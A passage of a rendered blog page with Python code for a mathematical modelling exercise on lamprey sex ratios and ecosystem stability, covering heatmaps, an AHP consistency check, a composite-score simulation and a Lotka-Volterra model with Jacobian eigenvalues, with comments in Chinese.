Ratio Variation&#x27;</span>, <span class=\"string\">&#x27;Birth and Death Rate&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Round the values directly on the DataFrame</span></span><br><span class=\"line\">df = pd.DataFrame(data, index=index).<span class=\"built_in\">round</span>(<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Increase the figure size for better visibility</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">12</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\">sns.heatmap(df, annot=<span class=\"literal\">True</span>, cmap=<span class=\"string\">&quot;YlGnBu&quot;</span>, linewidths=<span class=\"number\">.5</span>, fmt=<span class=\"string\">&#x27;.8f&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Impact of Factors on the Ecosystem - Heatmap&#x27;</span>)</span><br><span class=\"line\">plt.savefig(<span class=\"string\">&quot;zuizhongrelitu.png&quot;</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"calculate-the-maximum-eigenvalue求最大特征值\"><a class=\"anchor\" href=\"#calculate-the-maximum-eigenvalue求最大特征值\">#</a> calculate the maximum eigenvalue (求最大特征值)</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">consistency_ratio</span>(<span class=\"params\">CI, RI</span>):</span><br><span class=\"line\">    CR = CI / RI</span><br><span class=\"line\">    <span class=\"keyword\">return</span> CR</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 假设 A 是你的判断矩阵</span></span><br><span class=\"line\">A = np.array([</span><br><span class=\"line\">    [<span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">    [<span class=\"number\">5</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>],</span><br><span class=\"line\">    [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>]</span><br><span class=\"line\">])</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算特征值</span></span><br><span class=\"line\">eigenvalues, eigenvectors = np.linalg.eig(A)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 找到最大特征值</span></span><br><span class=\"line\">lambda_max = <span class=\"built_in\">max</span>(eigenvalues)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算一致性指标 CI</span></span><br><span class=\"line\">n = <span class=\"built_in\">len</span>(A)</span><br><span class=\"line\">CI = (lambda_max - n) / (n - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 查找平均随机一致性指标 RI</span></span><br><span class=\"line\">random_matrices = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> _ <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">500</span>):</span><br><span class=\"line\">    random_matrix = np.random.randint(<span class=\"number\">1</span>, n+<span class=\"number\">1</span>, size=(n, n))</span><br><span class=\"line\">    random_matrices.append(random_matrix)</span><br><span class=\"line\"></span><br><span class=\"line\">average_lambda_max = np.mean([<span class=\"built_in\">max</span>(np.linalg.eig(mat)[<span class=\"number\">0</span>]) <span class=\"keyword\">for</span> mat <span class=\"keyword\">in</span> random_matrices])</span><br><span class=\"line\">RI = (average_lambda_max - n) / (n - <span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 计算一致性比率 CR</span></span><br><span class=\"line\">CR = consistency_ratio(CI, RI)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;最大特征值 (λmax):&quot;</span>, lambda_max)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;一致性指标 CI:&quot;</span>, CI)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;查找平均随机一致性指标 RI:&quot;</span>, RI)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;一致性比率 CR:&quot;</span>, CR)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 判断一致性是否可接受</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> CR &lt; <span class=\"number\">0.10</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的一致性是可以接受的&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;判断矩阵的一致性需要适当修正&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"第二问雷达图\"><a class=\"anchor\" href=\"#第二问雷达图\">#</a> 第二问雷达图</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\"><span class=\"keyword\">import</span> seaborn <span class=\"keyword\">as</span> sns</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取Excel文件</span></span><br><span class=\"line\">file_path = <span class=\"string\">&#x27;shuju.xlsx&#x27;</span></span><br><span class=\"line\">df = pd.read_excel(file_path)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 提取需要的列</span></span><br><span class=\"line\">selected_columns = [<span class=\"string\">&#x27;Predation Threat&#x27;</span>, <span class=\"string\">&#x27;Reproduction Threat&#x27;</span>, <span class=\"string\">&#x27;Overfishing Risk&#x27;</span>,</span><br><span class=\"line\">                    <span class=\"string\">&#x27;Environmental Pressure&#x27;</span>, <span class=\"string\">&#x27;Predation Control&#x27;</span>, <span class=\"string\">&#x27;Food Chain Role&#x27;</span>, <span class=\"string\">&#x27;Adaptability&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建热力图</span></span><br><span class=\"line\">plt.figure(figsize=(<span class=\"number\">10</span>, <span class=\"number\">8</span>))</span><br><span class=\"line\">heatmap_data = df[selected_columns + [<span class=\"string\">&#x27;Gender Ratio Variation&#x27;</span>]]</span><br><span class=\"line\">heatmap = sns.heatmap(heatmap_data.corr(), annot=<span class=\"literal\">True</span>, cmap=<span class=\"string\">&quot;coolwarm&quot;</span>, fmt=<span class=\"string\">&quot;.2f&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 设置热力图的标题</span></span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Correlation Heatmap between Gender Ratio Variation and Other Factors&#x27;</span>)</span><br><span class=\"line\">plt.savefig(<span class=\"string\">&quot;123123.png&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\"># 显示热力图</span></span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">simulate_ecosystem</span>(<span class=\"params\">initial_ratio</span>):</span><br><span class=\"line\">    generations = <span class=\"number\">50</span></span><br><span class=\"line\">    gender_ratio = np.zeros(generations)</span><br><span class=\"line\">    gender_ratio[<span class=\"number\">0</span>] = initial_ratio</span><br><span class=\"line\"></span><br><span class=\"line\">    predator_population = np.ones(generations)</span><br><span class=\"line\">    reproductive_success = np.ones(generations)</span><br><span class=\"line\">    food_resources = np.ones(generations)</span><br><span class=\"line\">    composite_indicator = np.zeros(generations)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> gen <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, generations):</span><br><span class=\"line\">        gender_ratio[gen] = gender_ratio[gen - <span class=\"number\">1</span>]</span><br><span class=\"line\">        reproductive_success[gen] = reproductive_success[gen - <span class=\"number\">1</span>] - <span class=\"number\">0.005</span> * <span class=\"built_in\">abs</span>(gender_ratio[gen] - <span class=\"number\">0.5</span>)</span><br><span class=\"line\">        predator_population[gen] = predator_population[gen - <span class=\"number\">1</span>] * reproductive_success[gen]</span><br><span class=\"line\">        food_resources[gen] = food_resources[gen - <span class=\"number\">1</span>] - <span class=\"number\">0.02</span></span><br><span class=\"line\">        composite_indicator[gen] = <span class=\"number\">0.4</span> * gender_ratio[gen] + <span class=\"number\">0.3</span> * predator_population[gen] + <span class=\"number\">0.2</span> * reproductive_success[gen] + <span class=\"number\">0.1</span> * food_resources[gen]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> composite_indicator</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">evaluate_population</span>(<span class=\"params\">initial_ratio</span>):</span><br><span class=\"line\">    composite_indicator = simulate_ecosystem(initial_ratio)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算各个评价指标</span></span><br><span class=\"line\">    predation_control = np.mean(composite_indicator)</span><br><span class=\"line\">    food_chain_role = np.<span class=\"built_in\">max</span>(composite_indicator)</span><br><span class=\"line\">    ecosystem_provider = np.<span class=\"built_in\">sum</span>(composite_indicator)</span><br><span class=\"line\">    adaptability = np.<span class=\"built_in\">min</span>(composite_indicator)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 模拟其他劣势因素</span></span><br><span class=\"line\">    predation_threat = np.random.uniform(<span class=\"number\">0.1</span>, <span class=\"number\">0.5</span>)</span><br><span class=\"line\">    reproduction_threat = np.random.uniform(<span class=\"number\">0.1</span>, <span class=\"number\">0.5</span>)</span><br><span class=\"line\">    overfishing_risk = np.random.uniform(<span class=\"number\">0.1</span>, <span class=\"number\">0.5</span>)</span><br><span class=\"line\">    environmental_pressure = np.random.uniform(<span class=\"number\">0.1</span>, <span class=\"number\">0.5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算各个评价指标的权重</span></span><br><span class=\"line\">    weight_predation_control = <span class=\"number\">0.2</span></span><br><span class=\"line\">    weight_food_chain_role = <span class=\"number\">0.2</span></span><br><span class=\"line\">    weight_ecosystem_provider = <span class=\"number\">0.2</span></span><br><span class=\"line\">    weight_adaptability = <span class=\"number\">0.1</span></span><br><span class=\"line\">    weight_predation_threat = <span class=\"number\">0.1</span></span><br><span class=\"line\">    weight_reproduction_threat = <span class=\"number\">0.1</span></span><br><span class=\"line\">    weight_overfishing_risk = <span class=\"number\">0.1</span></span><br><span class=\"line\">    weight_environmental_pressure = <span class=\"number\">0.1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算综合评分</span></span><br><span class=\"line\">    overall_score = (weight_predation_control * predation_control +</span><br><span class=\"line\">                     weight_food_chain_role * food_chain_role +</span><br><span class=\"line\">                     weight_ecosystem_provider * ecosystem_provider +</span><br><span class=\"line\">                     weight_adaptability * adaptability -</span><br><span class=\"line\">                     weight_predation_threat * predation_threat -</span><br><span class=\"line\">                     weight_reproduction_threat * reproduction_threat -</span><br><span class=\"line\">                     weight_overfishing_risk * overfishing_risk -</span><br><span class=\"line\">                     weight_environmental_pressure * environmental_pressure)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> overall_score</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 循环遍历不同的 initial_ratio</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> initial_ratio <span class=\"keyword\">in</span> np.arange(<span class=\"number\">0</span>, <span class=\"number\">1.05</span>, <span class=\"number\">0.05</span>):</span><br><span class=\"line\">    initial_ratio = <span class=\"built_in\">round</span>(initial_ratio, <span class=\"number\">2</span>)  <span class=\"comment\"># 保留两位小数</span></span><br><span class=\"line\">    overall_score = evaluate_population(initial_ratio)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Initial Ratio: <span class=\"subst\">&#123;initial_ratio&#125;</span>, Overall Score: <span class=\"subst\">&#123;overall_score&#125;</span>&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 存储初始比例和综合评分的列表</span></span><br><span class=\"line\">initial_ratios = []</span><br><span class=\"line\">overall_scores = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 循环遍历不同的 initial_ratio</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> initial_ratio <span class=\"keyword\">in</span> np.arange(<span class=\"number\">0</span>, <span class=\"number\">1.05</span>, <span class=\"number\">0.05</span>):</span><br><span class=\"line\">    initial_ratio = <span class=\"built_in\">round</span>(initial_ratio, <span class=\"number\">2</span>)  <span class=\"comment\"># 保留两位小数</span></span><br><span class=\"line\">    overall_score = evaluate_population(initial_ratio)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 存储数据</span></span><br><span class=\"line\">    initial_ratios.append(initial_ratio)</span><br><span class=\"line\">    overall_scores.append(overall_score)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 绘制折线图</span></span><br><span class=\"line\">plt.plot(initial_ratios, overall_scores, marker=<span class=\"string\">&#x27;o&#x27;</span>)</span><br><span class=\"line\">plt.title(<span class=\"string\">&#x27;Overall Score vs Initial Gender Ratio&#x27;</span>)</span><br><span class=\"line\">plt.xlabel(<span class=\"string\">&#x27;Initial Gender Ratio&#x27;</span>)</span><br><span class=\"line\">plt.ylabel(<span class=\"string\">&#x27;Overall Score&#x27;</span>)</span><br><span class=\"line\">plt.grid(<span class=\"literal\">True</span>)</span><br><span class=\"line\">plt.show()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h3 id=\"雅克比矩阵\"><a class=\"anchor\" href=\"#雅克比矩阵\">#</a> 雅克比矩阵</h3>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">from</span> scipy.integrate <span class=\"keyword\">import</span> odeint</span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 七鳃鳗的雄性比例范围</span></span><br><span class=\"line\">Male_proportion = np.arange(<span class=\"number\">0.51</span>, <span class=\"number\">0.90</span>, <span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> s <span class=\"keyword\">in</span> Male_proportion:</span><br><span class=\"line\">    <span class=\"comment\"># 初始化模型参数</span></span><br><span class=\"line\">    Natural_Growth_Rate = <span class=\"number\">0.65</span>-<span class=\"number\">0.5</span>*<span class=\"built_in\">abs</span>(<span class=\"number\">0.5</span>-s)  <span class=\"comment\"># 七鳃鳗的自然增长率</span></span><br><span class=\"line\">    beta = <span class=\"number\">0.1</span>  <span class=\"comment\"># 七鳃鳗被捕食的概率</span></span><br><span class=\"line\">    gamma = <span class=\"number\">0.5</span> <span class=\"comment\">#捕食者自然死亡率</span></span><br><span class=\"line\">    delta = <span class=\"number\">0.15</span>*(<span class=\"number\">1</span>+beta*<span class=\"number\">0.9</span>)   <span class=\"comment\"># 捕食成功率</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 初始化种群数量</span></span><br><span class=\"line\">    x0 = <span class=\"number\">25</span>  <span class=\"comment\"># 初始七鳃鳗数量</span></span><br><span class=\"line\">    y0 = <span class=\"number\">2</span>  <span class=\"comment\"># 初始捕食者数量</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 设置模拟时间</span></span><br><span class=\"line\">    T = np.arange(<span class=\"number\">0</span>, <span class=\"number\">50</span>, <span class=\"number\">0.1</span>)  <span class=\"comment\"># 从0到50时间单位，每0.1单位计算一次</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 定义洛特卡-沃尔泰拉模型方程</span></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">lotka_volterra</span>(<span class=\"params\">Y, t</span>):</span><br><span class=\"line\">        prey, predator = Y</span><br><span class=\"line\">        dpreydt = Natural_Growth_Rate * prey - beta * prey * predator</span><br><span class=\"line\">        dpredatordt = delta * prey * predator - gamma * predator</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [dpreydt, dpredatordt]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 微分方程求解</span></span><br><span class=\"line\">    solution = odeint(lotka_volterra, [x0, y0], T)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 绘制结果</span></span><br><span class=\"line\">    plt.figure()</span><br><span class=\"line\">    plt.plot(T, solution[:, <span class=\"number\">0</span>], <span class=\"string\">&#x27;r-&#x27;</span>, label=<span class=\"string\">&#x27;Prey&#x27;</span>)</span><br><span class=\"line\">    plt.plot(T, solution[:, <span class=\"number\">1</span>], <span class=\"string\">&#x27;b-&#x27;</span>, label=<span class=\"string\">&#x27;Predator&#x27;</span>)</span><br><span class=\"line\">    plt.xlabel(<span class=\"string\">&#x27;Time&#x27;</span>)</span><br><span class=\"line\">    plt.ylabel(<span class=\"string\">&#x27;Population&#x27;</span>)</span><br><span class=\"line\">    plt.legend()</span><br><span class=\"line\">    plt.title(<span class=\"string\">&#x27;Lotka-Volterra Predator-Prey Model&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算雅可比矩阵</span></span><br><span class=\"line\">    J = np.array([[Natural_Growth_Rate - beta * solution[-<span class=\"number\">1</span>, <span class=\"number\">1</span>], -beta * solution[-<span class=\"number\">1</span>, <span class=\"number\">0</span>]],</span><br><span class=\"line\">                  [delta * solution[-<span class=\"number\">1</span>, <span class=\"number\">1</span>], -gamma - delta * solution[-<span class=\"number\">1</span>, <span class=\"number\">0</span>]]])</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 计算特征值</span></span><br><span class=\"line\">    eigenvalues = np.linalg.eigvals(J)</span><br><span class=\"line\">    <span class=\"comment\"># 输出相关信息</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;雄性比例p = <span class=\"subst\">&#123;s&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">f&#x27;Eigenvalues: <span class=\"subst\">&#123;eigenvalues&#125;</span>&#x27;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 判断稳定性</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">all</span>(np.real(eigenvalues) &lt; <span class=\"number\">0</span>):</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;系统稳定：&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;系统不稳定:&#x27;</span>)</span><br><span class=\"line\">plt.show()</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"雅克比矩阵matlab\"><a class=\"anchor\" href=\"#雅克比矩阵matlab\">#</a> 雅克比矩阵 MATLAB</h3>\n<p><figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span 